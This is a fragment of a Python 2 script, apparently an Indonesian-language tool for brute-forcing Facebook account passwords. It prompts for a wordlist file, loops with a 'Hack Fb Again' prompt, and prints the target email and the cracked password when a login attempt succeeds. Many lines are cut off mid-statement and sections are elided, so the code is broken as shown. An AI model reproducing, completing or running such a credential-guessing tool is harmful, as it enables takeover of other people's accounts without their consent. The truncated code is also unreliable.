...
print " "
print "\033[92m╭────\033[91m[ \033[96mMasukkan File Wordlist \033[95m( pass.txt ) \033[>
...
# useragents = [('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, >

def pil():
                print GG+" "
                g = str(raw_input("[?] Hack Fb Again..\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':                                                                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Keluar dari program..."                                                       sys.exit()
                else:
                    print RR+"Pilih Yang Benar..."                                                          pil()                                                               
def edit_wordlist():
                                                                                                print GG+" "
...
def iqbalz(iqbalz_password):
  try:
        sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\>
        sys.stdout.flush()
        ...
        if mask != login and (not 'login_attempt' in mask):
                        ...
                        print RR+"+-------------------------------------------+"
                        print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(ema>
                        print (RR+"#\033[97m Password Target:\033[92m {}").format(iqbal>
                        print " "
